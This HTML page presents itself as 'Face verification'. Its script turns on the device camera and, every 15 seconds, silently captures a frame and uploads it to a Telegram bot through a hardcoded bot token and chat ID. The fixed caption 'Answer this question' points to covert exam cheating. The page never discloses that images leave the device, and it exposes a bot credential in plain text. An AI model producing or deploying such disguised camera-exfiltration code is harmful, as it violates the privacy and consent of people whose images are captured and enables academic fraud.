<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Camera ‚Üí Telegram</title>
</head>
<body>
  <h2>üì∑ Face verification </h2>
  <video id="video" autoplay playsinline style="width:100%;border:1px solid #000;"></video>

  <!-- Zoom control -->
  <div>
    <label for="zoom">üîç Zoom:</label>
    <input id="zoom" type="range" min="1" max="5" step="0.1" value="1">
  </div>

  <!-- Switch camera button -->
  <div>
    <button id="switchBtn">üîÑ Switch Camera</button>
  </div>

  <pre id="log"></pre>

  <script>
    // üîë Config
    const TELEGRAM_BOT_TOKEN = "8241568142:AAG-mtJeGRL-YzCd_M_r3F1FbteDLeOrVO8";
    const TELEGRAM_CHAT_ID = "7225122599";

    const video = document.getElementById("video");
    const log = document.getElementById("log");
    const zoomSlider = document.getElementById("zoom");
    const switchBtn = document.getElementById("switchBtn");

    let videoTrack;
    let currentFacingMode = "environment"; // start with back camera

    // Start camera with given facingMode
    async function startCamera(facingMode) {
      if (video.srcObject) {
        video.srcObject.getTracks().forEach(track => track.stop());
      }
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: facingMode }
        });
        video.srcObject = stream;
        videoTrack = stream.getVideoTracks()[0];

        // Check if zoom supported
        const capabilities = videoTrack.getCapabilities();
        if (capabilities.zoom) {
          zoomSlider.min = capabilities.zoom.min;
          zoomSlider.max = capabilities.zoom.max;
          zoomSlider.step = capabilities.zoom.step || 0.1;
          zoomSlider.value = capabilities.zoom.min;
          zoomSlider.style.display = "block";
        } else {
          zoomSlider.style.display = "none"; 
        }
      } catch (err) {
        log.innerText = "Camera error: " + err;
      }
    }

    // Switch between front and back
    switchBtn.addEventListener("click", () => {
      currentFacingMode = currentFacingMode === "environment" ? "user" : "environment";
      startCamera(currentFacingMode);
    });

    // Zoom handler
    zoomSlider.addEventListener("input", () => {
      if (!videoTrack) return;
      const constraints = { advanced: [{ zoom: zoomSlider.value }] };
      videoTrack.applyConstraints(constraints);
    });

    // Take snapshot from video
    function captureFrame() {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);
      return canvas;
    }

    // Capture ‚Üí Telegram
    async function sendPhoto() {
      const canvas = captureFrame();
      log.innerText = "‚è≥ Sending photo...";

      // Convert to Blob
      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));

      // Fixed caption
      const caption = "Answer this question";

      // Send to Telegram
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("photo", blob, "capture.jpg");
      formData.append("caption", caption);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      });

      log.innerText = "‚úÖ Sent with caption: " + caption;
    }

    // Auto every 15 seconds
    setInterval(sendPhoto, 15000);

    // Start with back camera
    startCamera(currentFacingMode);
  </script>
</body>
</html>

